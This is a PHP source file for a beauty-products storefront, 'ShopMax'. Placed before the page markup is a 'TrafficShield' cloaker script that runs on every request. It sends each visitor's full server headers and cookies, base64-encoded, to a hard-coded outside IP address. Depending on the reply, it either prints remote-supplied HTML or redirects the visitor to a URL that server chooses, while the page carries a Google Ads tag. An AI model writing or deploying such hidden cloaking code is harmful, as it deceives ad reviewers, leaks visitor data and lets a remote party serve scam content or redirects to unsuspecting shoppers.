<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "006df6a5fa";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405745598";
            $headers['TS-BHDNR-74194'] = "006df6a5fa"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
                if($response->type == 1){
                    if(isset($response->zrc) && !empty($response->zrc)){
                            echo base64_decode($response->zrc);
                            die();
                        }else{            
                            $this->get_url($response->url,$response->http_code);
                        }
                }

            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>

<!DOCTYPE html>
<html lang="en">
  <head>

    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16664427754">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-16664427754');
</script>
    
    <title>ShopMax &mdash; Home</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">    
    <meta name="keywords" content="Beauty products, Makeup sale, Premium makeup, Top beauty brands, Beauty deals, Makeup discounts, Beauty trends">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mukta:300,400,700"> 
    <link rel="stylesheet" href="fonts/icomoon/style.css">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/magnific-popup.css">
    <link rel="stylesheet" href="css/jquery-ui.css">
    <link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">


    <link rel="stylesheet" href="css/aos.css">

    <link rel="stylesheet" href="css/style.css">
    
  </head>
  <body>
  
  <div class="site-wrap">
    

    <div class="site-navbar bg-white py-2">

      <div class="search-wrap">
        <div class="container">
          <a href="#" class="search-close js-search-close"><span class="icon-close2"></span></a>
          <form action="#" method="post">
            <input type="text" class="form-control" placeholder="Search keyword and hit enter...">
          </form>  
        </div>
      </div>

      <div class="container">
        <div class="d-flex align-items-center justify-content-between">
          <div class="logo">
            <div class="site-logo">
              <a href="index.php" class="js-logo-clone">ShopMax</a>
            </div>
          </div>
          <div class="main-nav d-none d-lg-block">
            <nav class="site-navigation text-right text-md-center" role="navigation">
              <ul class="site-menu js-clone-nav d-none d-lg-block">
                <li><a href="index.php">Home</a></li> 
                <li><a href="about.php">About Us</a></li>               
                <li><a href="popular-products.php">Popular Products</a></li>
                <li><a href="most-rated.php">Most Rated</a></li>
                <li><a href="policy.php">Privacy Policy</a></li>
                <li><a href="contact.php">Contact</a></li>
              </ul>
            </nav>
          </div>
          <div class="icons">
            <a href="#" class="icons-btn d-inline-block js-search-open"><span class="icon-search"></span></a>
            <a href="#" class="icons-btn d-inline-block"><span class="icon-heart-o"></span></a>
            <a href="cart.php" class="icons-btn d-inline-block bag">
              <span class="icon-shopping-bag"></span>
              <span class="number">2</span>
            </a>
            <a href="#" class="site-menu-toggle js-menu-toggle ml-3 d-inline-block d-lg-none"><span class="icon-menu"></span></a>
          </div>
        </div>
      </div>
    </div>

    <div class="site-blocks-cover" data-aos="fade">
      <div class="container">
        <div class="row">
          <div class="col-md-6 ml-auto order-md-2 align-self-start">
            <div class="site-block-cover-content">
            <h2 class="sub-title">#New Summer Collection 2024</h2>
            <h1>Arrivals Sales</h1>
            </div>
          </div>
          <div class="col-md-6 order-1 align-self-end">
            <img src="images/model_3.png" alt="Image" class="img-fluid">
          </div>
        </div>
      </div>
    </div>

    
    
    <div class="site-section">
      <div class="container">
        <div class="row">
          <div class="title-section mb-5 col-12">
            <h2 class="text-uppercase">Popular Products</h2>
          </div>
        </div>
        <div class="row">
          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="face-foundation.php" class="product-item md-height bg-gray d-block">
              <img src="images/face_sugar.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="face-foundation.php">Face Foundation</a></h2>
            <strong class="item-price">$10.00</strong>
          </div>
          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="face-powder.php" class="product-item md-height bg-gray d-block">
              <img src="images/face_powder.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="face-powder.php">Face Powder</a></h2>
            <strong class="item-price"><del>$25.00</del> $15.00</strong>
          </div>

          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="liq-lipstick.php" class="product-item md-height bg-gray d-block">
              <img src="images/lipstick.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="liq-lipstick.php">Liquid Lipstick</a></h2>
            <strong class="item-price"><del>$16.00</del> $9.00</strong>

            <div class="star-rating">
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
            </div>

          </div>
          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="foundation-brush.php" class="product-item md-height bg-gray d-block">
              <img src="images/foundation_brush.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="foundation-brush.php">Foundation Brush</a></h2>
            <strong class="item-price"><del>$10.00</del> $6.00</strong>
            <div class="star-rating">
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
              <span class="icon-star2 text-warning"></span>
            </div>
          </div>

          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="eyebrow-pen.php" class="product-item md-height bg-gray d-block">
              <img src="images/eyebrow_pen.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="eyebrow-pen.php">Eyebrow Pen</a></h2>
            <strong class="item-price"><del>$11.00</del> $7.00</strong>
          </div>
          <div class="col-lg-4 col-md-6 item-entry mb-4">
            <a href="ice-roller.php" class="product-item md-height bg-gray d-block">
              <img src="images/ice_roller.jpg" alt="Image" class="img-fluid">
            </a>
            <h2 class="item-title"><a href="ice-roller.php">Ice Roller</a></h2>
            <strong class="item-price"><del>$9.00</del> $4.00</strong>
          </div>>

        </div>
      </div>
    </div>

    <div class="site-section">
      <div class="container">
        <div class="row">
          <div class="title-section text-center mb-5 col-12">
            <h2 class="text-uppercase">Most Rated</h2>
          </div>
        </div>
        <div class="row">
          <div class="col-md-12 block-3">
            <div class="nonloop-block-3 owl-carousel">
              <div class="item">
                <div class="item-entry">
                  <a href="eyeliner.php" class="product-item md-height bg-gray d-block">
                    <img src="images/eye_liner.jpg" alt="Image" class="img-fluid">
                  </a>
                  <h2 class="item-title"><a href="eyeliner.php">Eyeliner</a></h2>
                  <strong class="item-price"><del>$8.00</del> $5.00</strong>
                  <div class="star-rating">
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                  </div>
                </div>
              </div>
              <div class="item">
                <div class="item-entry">
                  <a href="nail_lacquer.php" class="product-item md-height bg-gray d-block">
                    <img src="images/nail_lacquer.jpg" alt="Image" class="img-fluid">
                  </a>
                  <h2 class="item-title"><a href="nail_lacquer.php">Nail Lacquer</a></h2>
                  <strong class="item-price"><del>$7.00</del> $3.00</strong>

                  <div class="star-rating">
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                  </div>
                </div>
              </div>
              <div class="item">
                <div class="item-entry">
                  <a href="perfume_ind.php" class="product-item md-height bg-gray d-block">
                    <img src="images/perfume1.jpg" alt="Image" class="img-fluid">
                  </a>
                  <h2 class="item-title"><a href="#">Perfume</a></h2>
                  <strong class="item-price"><del>$75.00</del> $52.00</strong>

                  <div class="star-rating">
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                    <span class="icon-star2 text-warning"></span>
                  </div>

                </div>
              </div>
              
              

            </div>
          </div>
        </div>
      </div>
    </div>


    <div class="site-blocks-cover inner-page py-5" data-aos="fade">
      <div class="container">
        <div class="row">
          <div class="col-md-6 ml-auto order-md-2 align-self-start">
            <div class="site-block-cover-content">
            <h2 class="sub-title">#New Summer Collection 2024</h2>
            <h1>New Hair Colors</h1>
            </div>
          </div>
          <div class="col-md-6 order-1 align-self-end">
            <img src="images/model_1.png" alt="Image" class="img-fluid">
          </div>
        </div>
      </div>
    </div>

    <footer class="site-footer custom-border-top">
      <div class="container">
        <div class="row">
          <div class="col-md-6 col-lg-3 mb-4 mb-lg-0">
            <h3 class="footer-heading mb-4">Promo</h3>
            <a href="perfect-shade.php" class="block-6">
              <img src="images/lip_peel.jpg" alt="Image placeholder" class="img-fluid rounded mb-4">
              <h3 class="font-weight-light  mb-0">Finding Your Perfect Shade This Summer</h3>
              <p>Promo from  July 15 &mdash; Aug 15, 2024</p>
            </a>
          </div>
          <div class="col-lg-5 ml-auto mb-5 mb-lg-0">
            <div class="row">
              <div class="col-md-12">
                <h3 class="footer-heading mb-4">Quick Links</h3>
              </div>
              <div class="col-md-6 col-lg-4">
                <ul class="list-unstyled">
                  <li><a href="toiletry-bag.php">Bags</a></li>
                  <li><a href="skin-softener.php">Skin</a></li>
                  <li><a href="lip-mask.php">Lips</a></li>
                </ul>
              </div>
              <div class="col-md-6 col-lg-4">
                <ul class="list-unstyled">
                  <li><a href="perfume.php">Perfumes</a></li>
                  <li><a href="liq-lipstick.php">Lipsticks</a></li>
                  <li><a href="eyeliner.php">Eye Liners</a></li>
                </ul>
              </div>
              <div class="col-md-6 col-lg-4">
                <ul class="list-unstyled">
                  <li><a href="face-foundation.php">Face Pack</a></li>
                  <li><a href="nail_lacquer.php">Nail Art</a></li>
                  <li><a href="face-powder.php">Face Powder</a></li>
                </ul>
              </div>
            </div>
          </div>
          
          <div class="col-md-6 col-lg-3">
            <div class="block-5 mb-5">
              <h3 class="footer-heading mb-4">Contact Info</h3>
              <ul class="list-unstyled">
                <li class="address">3917, Spring Dr, Spring Valley, California(CA), 91977, USA</li>
                <li class="phone"><a href="tel://23923929210">(619) 469-1965</a></li>
                <li class="email">info@shopmax.com</li>
              </ul>
            </div>

            <div class="block-7">
              <form action="#" method="post">
                <label for="email_subscribe" class="footer-heading">Subscribe</label>
                <div class="form-group">
                  <input type="text" class="form-control py-4" id="email_subscribe" placeholder="Email">
                  <input type="submit" class="btn btn-sm btn-primary" value="Send">
                </div>
              </form>
            </div>
          </div>
        </div>
        <div class="row pt-5 mt-5 text-center">
          <div class="col-md-12">
            <p>
            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
            Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved to <i class="icon-heart" aria-hidden="true"></i> ShopMax</a>
            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
            </p>
          </div>
          
        </div>
      </div>
    </footer>
  </div>

  <script src="js/jquery-3.3.1.min.js"></script>
  <script src="js/jquery-ui.js"></script>
  <script src="js/popper.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/owl.carousel.min.js"></script>
  <script src="js/jquery.magnific-popup.min.js"></script>
  <script src="js/aos.js"></script>

  <script src="js/main.js"></script>
    
  </body>
</html>
